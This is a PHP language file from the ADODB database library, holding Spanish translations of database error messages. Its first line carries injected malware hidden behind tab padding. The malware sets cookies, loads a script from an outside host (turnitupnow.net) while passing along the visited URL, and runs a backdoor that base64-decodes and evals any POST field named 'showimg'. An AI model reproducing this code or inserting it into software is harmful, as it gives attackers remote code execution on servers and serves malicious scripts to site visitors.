<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

// contributed by "Horacio Degiorgi" <horaciod@codigophp.com>
$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'es',
            DB_ERROR                    => 'error desconocido',
            DB_ERROR_ALREADY_EXISTS     => 'ya existe',
            DB_ERROR_CANNOT_CREATE      => 'imposible crear',
            DB_ERROR_CANNOT_DELETE      => 'imposible borrar',
            DB_ERROR_CANNOT_DROP        => 'imposible hacer drop',
            DB_ERROR_CONSTRAINT         => 'violacion de constraint',
            DB_ERROR_DIVZERO            => 'division por cero',
            DB_ERROR_INVALID            => 'invalido',
            DB_ERROR_INVALID_DATE       => 'fecha u hora invalida',
            DB_ERROR_INVALID_NUMBER     => 'numero invalido',
            DB_ERROR_MISMATCH           => 'error',
            DB_ERROR_NODBSELECTED       => 'no hay base de datos seleccionada',
            DB_ERROR_NOSUCHFIELD        => 'campo invalido',
            DB_ERROR_NOSUCHTABLE        => 'tabla no existe',
            DB_ERROR_NOT_CAPABLE        => 'capacidad invalida para esta DB',
            DB_ERROR_NOT_FOUND          => 'no encontrado',
            DB_ERROR_NOT_LOCKED         => 'no bloqueado',
            DB_ERROR_SYNTAX             => 'error de sintaxis',
            DB_ERROR_UNSUPPORTED        => 'no soportado',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'la cantidad de columnas no corresponden a la cantidad de valores',
            DB_ERROR_INVALID_DSN        => 'DSN invalido',
            DB_ERROR_CONNECT_FAILED     => 'fallo la conexion',
            0	                       => 'sin error', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'insuficientes datos',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'extension no encontrada',
            DB_ERROR_NOSUCHDB           => 'base de datos no encontrada',
            DB_ERROR_ACCESS_VIOLATION   => 'permisos insuficientes'
);
?>